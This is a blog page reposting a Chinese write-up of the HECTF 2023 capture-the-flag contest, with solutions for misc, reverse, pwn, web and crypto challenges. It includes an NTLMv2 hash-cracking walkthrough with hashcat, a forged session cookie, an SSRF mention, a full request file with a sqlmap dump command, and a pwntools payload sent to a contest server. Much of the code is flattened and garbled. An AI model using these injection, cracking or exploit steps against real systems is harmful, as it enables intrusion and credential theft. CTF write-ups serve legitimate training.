@@ -1,0 +1,286 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>HECTF-2023 WriteUp | PUDONG LAB</title><meta name="author" content="朴冬,2559874620@qq.com/tyjiang@stu.xjtu.edu.cn"><meta name="copyright" content="朴冬"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="HECTF 2023 多关MISC：OSINT+牌型密码+拼图+NTLM">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HECTF-2023 WriteUp">
+<meta property="og:url" content="https://pudong617.github.io/2023/01/01/ctf-kb/wp/Misc/HECTF-2023_WriteUp/">
+<meta property="og:site_name" content="PUDONG LAB">
+<meta property="og:description" content="HECTF 2023 多关MISC：OSINT+牌型密码+拼图+NTLM">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pudong617.github.io/img/youli.png">
+<meta property="article:published_time" content="2022-12-31T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-12-31T16:00:00.000Z">
+<meta property="article:author" content="朴冬">
+<meta property="article:tag" content="osint">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pudong617.github.io/img/youli.png"><link rel="shortcut icon" href="/img/PU-LOGO.png"><link rel="canonical" href="https://pudong617.github.io/2023/01/01/ctf-kb/wp/Misc/HECTF-2023_WriteUp/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'HECTF-2023 WriteUp',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-01-01 00:00:00'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><style>
+  /* 冷色极光渐变背景：与主题主色 #49B1F5 / #00C4B6 同色系 */
+  html #web_bg {
+    background-color: #F5FAFF;
+    background-image:
+      radial-gradient(1200px 700px at 12% -10%, rgba(73, 177, 245, .55), transparent 60%),
+      radial-gradient(1000px 650px at 92% 15%, rgba(0, 196, 182, .40), transparent 60%),
+      radial-gradient(900px 560px at 68% 108%, rgba(255, 114, 66, .16), transparent 62%),
+      linear-gradient(155deg, #E3F2FF 0%, #F6FBFF 45%, #E4F8F2 100%);
+  }
+  /* 暗色模式：同构图，降低光斑强度 */
+  html[data-theme='dark'] #web_bg {
+    background-color: #0B121A;
+    background-image:
+      radial-gradient(1100px 700px at 10% -8%, rgba(73, 177, 245, .45), transparent 62%),
+      radial-gradient(1000px 620px at 92% 12%, rgba(0, 196, 182, .32), transparent 62%),
+      radial-gradient(800px 520px at 72% 105%, rgba(255, 114, 66, .10), transparent 60%),
+      linear-gradient(160deg, #0B121A 0%, #0C1A24 50%, #0A1E20 100%);
+  }
+</style>
+<link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/youli.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1050</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">879</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 分享</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> LINK</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background: radial-gradient(1100px 620px at 18% 8%, rgba(73, 177, 245, .55), transparent 60%), radial-gradient(900px 520px at 82% 22%, rgba(0, 196, 182, .45), transparent 62%), radial-gradient(700px 460px at 55% 108%, rgba(255, 114, 66, .18), transparent 60%), linear-gradient(155deg, #0A1A2B 0%, #0E3049 48%, #083F45 100%)"><nav id="nav"><span id="blog-info"><a href="/" title="PUDONG LAB"><img class="site-icon" src="/img/pudong.png"/></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 分享</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> LINK</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">HECTF-2023 WriteUp</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-12-31T16:00:00.000Z" title="发表于 2023-01-01 00:00:00">2023-01-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-12-31T16:00:00.000Z" title="更新于 2023-01-01 00:00:00">2023-01-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/">CTF知识库</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/WP/">WP</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/Misc/">Misc</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="HECTF-2023 WriteUp"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
+<p>原文: <a target="_blank" rel="noopener" href="https://www.ctfiot.com/147010.html">https://www.ctfiot.com/147010.html</a><br>ID: 147010</p>
+</blockquote>
+<p>Misc</p>
+<p>无需多言</p>
+<p>HECTF{Welcome_To_HECTF_2023}</p>
+<p>Osint</p>
+<p>HECTF{河北省邯郸市永年区永年太极广场}</p>
+<p>密码：X2z0Um23RF</p>
+<p>压缩包数据：</p>
+<p>导出gif图片</p>
+<p>黑桃-&gt;s 红桃-&gt;h 梅花-&gt;c 红尖-&gt;d</p>
+<p>得到密码。根据牌</p>
+<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1Lj41187kx/">https://www.bilibili.com/video/BV1Lj41187kx/</a></p>
+<p>一共b站视频，对应图片binwalk出的密码。</p>
+<p>small joker -&gt; kafbig joker -&gt; wi1</p>
+<p>最后在农民的牌得到flag图片</p>
+<p>HECTF{Dou_di_Zhu_uhZ_id_uoD_hEccctf_TY6d145A57R7WVz}</p>
+<p>跟据提示得到密码</p>
+<p>百度网盘是二维码拼图：</p>
+<p>直接拼，才24张</p>
+<p>恭喜weber获得最后的flag：</p>
+<p>HECTF{java_ca_fei_bao_bei}</p>
+<p>打开压缩包</p>
+<p>发现很明显的是</p>
+<p>NTLM的流量包</p>
+<p>第一步先过滤</p>
+<p>ntlmssp这一字符串进行数据包筛选，获得身份验证的握手包。</p>
+<p>查找NTLMSSP_AUTH包。将数据包向下过滤到Security Blob层，就可以得到如下好东西：</p>
+<p>将域名和用户名复制到文本文档中。</p>
+<p>深入查找NTLM响应部分，找到NTProofStr字段和NTLMv2的响应。将它们作为十六进制字符串复制到文本文档中。</p>
+<p>NTLMv2Response是从ntlmProofStr开始，因此从NTLMv2的响应中删除ntlmProofStr。</p>
+<p>在Wireshark的搜索过滤器中输入ntlmssp.ntlmserverchallenge。就会发现NTLM Server Challenge字段，通常这个数据包是在NTLM_Auth数据包之前。将该值作为十六进制字符串复制到文本文档。</p>
+<p>将以上的所有值按以下格式保存到crackme.txt：</p>
+<p>username::<br>domain:<br>ServerChallenge:<br>NTproofstring:<br>modifiedntlmv2response</p>
+<p>利用hashcat爆破</p>
+<p>hashcat -m 5600 crackme.txt rockyou.txt</p>
+<p>得到密码  qwe123!@#</p>
+<p>md5加密得到flag</p>
+<p>HECTF{fca812f055d5fdcd3a355b63ceaad991}</p>
+<p>Re</p>
+<p>一眼顶真，循环异或</p>
+<p>HECTF{T31s_1s_A_mAg1ca1_3h1ng}</p>
+<p>hook出他的密文，一眼顶针是个迷宫</p>
+<p>分析代码，发现他的默认变换改成了hjkl，对应的变换一下啊就可以了</p>
+<p>HECTF{jjjjjljjjlljlllkklkkkhhh}</p>
+<p>分析代码可知就是abcdef的操作都来了一遍，除了c那个有个异或其他都是替换，没啥用，直接写脚本</p>
+<p>a &#x3D; [0x4d, 0x42, 0x44, 0x51, 0x3f, 0x7c, 0x4f, 0x6a, 0x58, 0x74, 0x34, 0x62, 0x6a, 0x74, 0x58, 0x6f, 0x34, 0x73, 0x7e, 0x58, 0x74, 0x36, 0x6a, 0x75, 0x69, 0x34, 0x7a]<br>for i in range(len(a)):    a[i] &#x3D; (a[i] + 1) ^ 6    print(chr(a[i]),end&#x3D;’’)</p>
+<p>HECTF{Vm_s3ems_v3ry_s1mpl3}</p>
+<p>pwn</p>
+<p>from pwn import *<br>r &#x3D; remote(“101.133.164.228”,30380)pl &#x3D; ‘-4294967230’r.sendline(pl)<br>r.interactive()</p>
+<p>web</p>
+<p>抓包一步步做</p>
+<p>session伪造的cookie key为zxk1ing</p>
+<p>eyJrZXkiOiJ6eGsxaW5nIiwidXNlcm5hbWUiOiJ6eGsxaW5nIn0.ZVgYag.z2BMF2B8kyQS7DC41cdDPeTvtCE</p>
+<p>之后访问&#x2F;P1aceuWillneverkn0w</p>
+<p>只有一个图片，访问图片发现存在url</p>
+<p>测试发现ssrf漏洞</p>
+<p>直接读取flag</p>
+<p>什么？投菜村长一票就送遥遥领先手机（sort传参）</p>
+<p>打开页面，404的大字在眼前</p>
+<p>发包会发现注释里有个404.php</p>
+<p>访问</p>
+<p>跳转的投票界面</p>
+<p>测了好久发现是sql注入，太不明显了！！！！</p>
+<p>sqlmap直接索了</p>
+<p>1.txt</p>
+<p>POST &#x2F;404.php HTTP&#x2F;1.1Host: 101.133.164.228:<br>32385User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:<br>109.0) Gecko&#x2F;20100101 Firefox&#x2F;119.0Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,<em>&#x2F;</em>;q&#x3D;0.8Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2Accept-Encoding: gzip, deflateContent-Type: application&#x2F;x-www-form-urlencodedContent-Length: 6Origin: <a target="_blank" rel="noopener" href="http://101.133.164.228/">http://101.133.164.228</a>:<br>32385Connection: closeReferer: <a target="_blank" rel="noopener" href="http://101.133.164.228/">http://101.133.164.228</a>:<br>32385&#x2F;404.phpCookie: token&#x3D;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjExIn0.YrHwWF1RRyxqpta2G-dnwRRjoq53lCOLYVxv4l_BLMI; seed&#x3D;976696390Upgrade-Insecure-Requests: 1<br>sort&#x3D;1</p>
+<p>python3 sqlmap.py -r 1.txt -D ctf -T users  -dump -batch</p>
+<p>得到flag</p>
+<p>HECTF{Jia_You_Weber}</p>
+<p>Crypto</p>
+<p>得到seed</p>
+<p>114514</p>
+<p>#脚本1#Sage<br>import binascii<br>def attack(c1, c2, n, e):    PR.<x>&#x3D;PolynomialRing(Zmod(n))    # replace a,b,c,d    g1 &#x3D; (30509*x+13601)*<em>e - c1    g2 &#x3D; (92095</em>x+27065)**e - c2<br>    def gcd(g1, g2):        while g2:            g1, g2 &#x3D; g2, g1 % g2        return g1.monic()    return -gcd(g1, g2)[0]c &#x3D; 23001012057110779471190091625946693776382380529397302126337301229214301450335125076016991835054198112255974220434689958104931664098817350134656616154892781885504255726632558690544057380195511404078662094726952602350250840712610362029824982069179543810686494204685887486972937880502875441232004432323308734978847464589775857815430854038396134952486665687531579988133729365443247597395131516449487146786214227230853061720614077115599878358089377114269765796099004940883513036567103436154122335792598432012140232905658895014924069330265282364249236142072335363164451294973492092043110680377767954710822286121195290921259n &#x3D; 25797576442752368834409243494498462987370374608513814739930733437032797864549696772439769896270235017474841764016848627149724764584643408544417890463920153063835758878658712790547466715525246861709503145754424896044647787146006099053059124466248594151765065039034244830614724509092882854620642569723528913880146979990993657935598837645247839225413889995373643109990149255485373119338024345925311643249141660177285328457994476509430988280481564046398593906405870633323621548853838399385539924067139236445142933316057900841508972844270649504321178274091144241788883353514769368447833090379142367062327674855735832181241c1 &#x3D; 5702553209026762891130621254037294747819864952568824327221430749829654552175171307151888953348659971422228556686092434932000213695492351602755144510029319044193567051613888876933660356756790444392278614143455408803808095980542751023095024106689759843322130186219560734082292015929006937318400901378373771587448471762923415750064340829545587346927358411518874090282598069394946985795177419501659425500481799157093068337225389827654860680897913114945871197415129055139716514884716404289565297854681809258375973195355836553939670482515484347869258398517276876478311544109924573128946617113822561968330536525876279165313c2 &#x3D; 17562619948191690401152271053920025392401205523418067246455197241332062181407775133406742024747779181762812656501246379566147855594504112107873162350649668441267907193889705868572309785100582281795380779594946422800722070311908572538672508371123334385630310655242811756206073131919770939609347021343765434127086363844595938894714892990053114153402729297796655717510572619694559203260762574159375142757462082162882775921182437134358375300674547217425590072112733480640372328934982979603312597484512120618223179217692002851194538130349201457319160001114007059615596355221194709809437500052122684989302563103918409825040e &#x3D; 17m1 &#x3D; attack(c1, c2, n, e)print(binascii.unhexlify(“%x” % int(m1)))</p>
+<p>HECTF{r3411y_easy_R4nd0m_And_r3l4ted_m3554ge_att4ck}</p>
+<p>from Crypto.Util.number import long_to_bytes, bytes_to_long<br>encrypted_message &#x3D; b’xa1x14xa66x9cx88xe3xeco?xe2x95xbdxcdx1a2)ixf5_)x15Hxf2yxecx8dxfc*KUxefvxddxd0X’</p>
+<h1 id="逆向-circular-shift-left-函数"><a href="#逆向-circular-shift-left-函数" class="headerlink" title="逆向 circular_shift_left 函数"></a>逆向 circular_shift_left 函数</h1><p>def circular_shift_left(int_value, k, bit&#x3D;32):    bin_value &#x3D; bin(int_value)[2:].zfill(32)    bin_value &#x3D; bin_value[k:] + bin_value[:k]    int_value &#x3D; int(bin_value, 2)    return int_value<br>def dec_block(block):    block ^&#x3D; 3279553481    block &#x3D; circular_shift_left(block, 21)    block ^&#x3D; 1909693462    block &#x3D; long_to_bytes(block)    return block</p>
+<h1 id="逆向-convert-函数"><a href="#逆向-convert-函数" class="headerlink" title="逆向 convert 函数"></a>逆向 convert 函数</h1><p>def myfill(num,fill_num):<br>    return bin(num)[2:].zfill(fill_num)<br>n1 &#x3D; myfill(2245263360,32)n2 &#x3D; myfill(2029229568,32)def reverse_convert(c):    # 先将字节块转换为16进制字符串，然后去掉前缀 ‘0x’，最后填充至32位    c &#x3D; c.hex()    c &#x3D; myfill(int(c, 16), 32)<br>    #4    m1 &#x3D; int(c[:13],2)^int(c[-13:],2)    m1 &#x3D; myfill(m1,13)    c &#x3D; c[:19]+m1<br>    #3    m1 &#x3D; int(c[:15],2)^(int(c[-15:],2)&amp;int(n1[:15],2))    m1 &#x3D; myfill(m1,15)    c &#x3D; m1+c[15:]<br>    #2    m1 &#x3D; c[-9:]    m2 &#x3D; int(c[-18:-9],2)^(int(m1,2)&amp;int(n2[-18:-9],2))    m2 &#x3D; myfill(m2,9)    m3 &#x3D; int(c[-27:-18],2)^(int(m2,2)&amp;int(n2[-27:-18],2))    m3 &#x3D; myfill(m3,9)    m4 &#x3D; int(c[:5],2)^(int(m3[-5:],2)&amp;int(n2[:5],2))    m4 &#x3D; myfill(m4,5)    c &#x3D; m4+m3+m2+m1<br>    #1    m1 &#x3D; int(c[13:26],2)^int(c[:13],2)    m1 &#x3D; myfill(m1,13)    m2 &#x3D; int(m1[:6],2)^int(c[-6:],2)    m2 &#x3D; myfill(m2,6)    c &#x3D; c[:13]+m1+m2<br>    return int(c, 2)</p>
+<h1 id="解密整个消息"><a href="#解密整个消息" class="headerlink" title="解密整个消息"></a>解密整个消息</h1><p>def my_decblock(encrypted_message):    assert len(encrypted_message) % 4 &#x3D;&#x3D; 0    decrypted_message &#x3D; b’’    IV &#x3D; bytes_to_long(b’retu’)    blocks &#x3D; [encrypted_message[i:i + 4] for i in range(0, len(encrypted_message), 4)]<br>    # 解密每个块    for i in range(len(blocks)):        block &#x3D; bytes_to_long(blocks[i])        block ^&#x3D; IV        block &#x3D; dec_block(block)        block &#x3D; reverse_convert(block)  # reverse_convert 现在返回整数        IV &#x3D; bytes_to_long(blocks[i])  # 更新 IV 为当前块的密文        decrypted_message +&#x3D; long_to_bytes(block, 4)  # block 现在是整数<br>    return decrypted_message</p>
+<h1 id="解密得到flagflag-my-decblock-encrypted-message-print-“Recovered-flag-”-flag"><a href="#解密得到flagflag-my-decblock-encrypted-message-print-“Recovered-flag-”-flag" class="headerlink" title="解密得到flagflag &#x3D; my_decblock(encrypted_message)print(“Recovered flag:”, flag)"></a>解密得到flagflag &#x3D; my_decblock(encrypted_message)print(“Recovered flag:”, flag)</h1><p>Recovered flag: b’HECTF{spodjoqw321jp3ij09adfiosofrga}’</p>
+<p>根据题目描述，每是个字符为一组，从第一组开始偏移一位，其他组依次递增</p>
+<p>偏移的话就是凯撒</p>
+<p>写出脚本</p>
+<p>def caesar_cipher_decrypt(char, shift):    # 将字符转换为其ASCII码值    ascii_value &#x3D; ord(char)    # 减去偏移量    shifted_value &#x3D; ascii_value - shift    # 将偏移后的ASCII码值转换回字符    return chr(shifted_value)<br>def split_and_decrypt(text, group_size):    groups &#x3D; [text[i:i+group_size] for i in range(0, len(text), group_size)]    decrypted_groups &#x3D; []    for i, group in enumerate(groups):        shift &#x3D; i + 1        decrypted_group &#x3D; ‘’.join(caesar_cipher_decrypt(char, shift) for char in group)        decrypted_groups.append(decrypted_group)    return decrypted_groups</p>
+<h1 id="示例字符串input-text-“zpvepoudbsgcdqwvjgocqg-rxrqo-feviefsyx-szwt-skqfl-NKIZLYZUVfU-jslhyfzmiom”-按照要求分组和解密result-split-and-decrypt-input-text-10"><a href="#示例字符串input-text-“zpvepoudbsgcdqwvjgocqg-rxrqo-feviefsyx-szwt-skqfl-NKIZLYZUVfU-jslhyfzmiom”-按照要求分组和解密result-split-and-decrypt-input-text-10" class="headerlink" title="示例字符串input_text &#x3D; “zpvepoudbsgcdqwvjgocqg|rxrqo|feviefsyx}szwt|skqfl?NKIZLYZUVfU|jslhyfzmiom”# 按照要求分组和解密result &#x3D; split_and_decrypt(input_text, 10)"></a>示例字符串input_text &#x3D; “zpvepoudbsgcdqwvjgocqg|rxrqo|feviefsyx}szwt|skqfl?NKIZLYZUVfU|jslhyfzmiom”# 按照要求分组和解密result &#x3D; split_and_decrypt(input_text, 10)</h1><h1 id="输出结果for-i-group-in-enumerate-result-print-f”Group-i-1-group-”"><a href="#输出结果for-i-group-in-enumerate-result-print-f”Group-i-1-group-”" class="headerlink" title="输出结果for i, group in enumerate(result):    print(f”Group {i+1}: {group}”)"></a>输出结果for i, group in enumerate(result):    print(f”Group {i+1}: {group}”)</h1><p>HECTF{STOP_Nuclear_sewage}</p>
+<p>from Crypto.Cipher import AESfrom Crypto.Util.number import long_to_bytesxor_result &#x3D; 113271863767201424639329153097952947311122854394813183532903131317262533549675encrypted_flag &#x3D; b’_1x16xc2;xb1xddyx14xddx14xe5{x19x04:’xor_result_bytes &#x3D; long_to_bytes(xor_result)key_high &#x3D; xor_result_bytes[:16]secret_key &#x3D; key_high + key_highxor_result_low &#x3D; xor_result_bytes[-16:]init_vector &#x3D; bytes(a ^ b for a, b in zip(secret_key[:16], xor_result_low))cipher &#x3D; AES.new(secret_key, AES.MODE_CBC, init_vector)decrypted_flag &#x3D; cipher.decrypt(encrypted_flag)print(f”Decrypted flag: {decrypted_flag}”)</p>
+<h1 id="Decrypted-flag-b’RSAKEYISFTCEHx00x00x01’"><a href="#Decrypted-flag-b’RSAKEYISFTCEHx00x00x01’" class="headerlink" title="Decrypted flag: b’RSAKEYISFTCEHx00x00x01’"></a>Decrypted flag: b’RSAKEYISFTCEHx00x00x01’</h1><p>压缩包密码 FTCEH</p>
+<p>e&#x3D;65537n&#x3D;: 17290066070594979571009663381214201320459569851358502368651245514213538229969915658064992558167323586895088933922835353804055772638980251328261c&#x3D;:<br>7650350848303138131393086727727533413756296838218347123997040508192472569084746342253915001354023303648603939313635106855058934664365503492172没了 真没了 加油少年</p>
+<p>很小，n直接分解</p>
+<p>得到第二个key</p>
+<p>keyisEa51stRsA</p>
+<p>gIHkeIlRQp1fLeSWEqZJdOTO4aRYRB2OGRcBycHQ1OAdi6UEULYbwIvYh+0alYScSEoN4TOejgTj<br>dPsetrURRlLX6dcifjX6VvLxY7TnMk7c8&#x2F;xy17mybq&#x2F;yNQf0vFGh8byC88bUeHian9dA2Qh6rRBY<br>S1I7iNxM62RtCFZ+1OKeaqGIDjf3&#x2F;VuPlbnCePYIY5FVs6xNXjkGh0m57t2QW4CoGI5lz6OcAAwg<br>4AHP0d8CfeldOF&#x2F;TogPwOiPaRlDbtHXCh54Bs5ZivV+jDerr0RQvCGYBFHYLJnvyrFtyZC9BxAQ8<br>gQnGlWNDjE1V6BByUvJjpI9DcUyRSNN21rUWouOiLwtKX0BgDQkGH9PhtzhmGYI+R3lZJ4x30l+X<br>qweu<br>DES CBC PKCS7 key：hectf iv：0000</p>
+<p>你知道么？梵蒂冈的常住人口只有800人，同时，仅澳大利亚就有4700万只袋鼠。如果袋鼠决定入侵梵蒂冈，那么每一个梵蒂冈人要打58750只袋鼠，你不知道！你不在乎！你只关心你自己的flagHECTF{DES_RSA_AES_WOMENSA_ZHENQIANG}</p>
+<p>长</p>
+<p>按</p>
+<p>关</p>
+<p>注</p>
+<p>网络安全社团公众号</p>
+<p>微信号 : qlnu_ctf</p>
+<p>新浪微博：齐鲁师范学院网络安全社团</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span 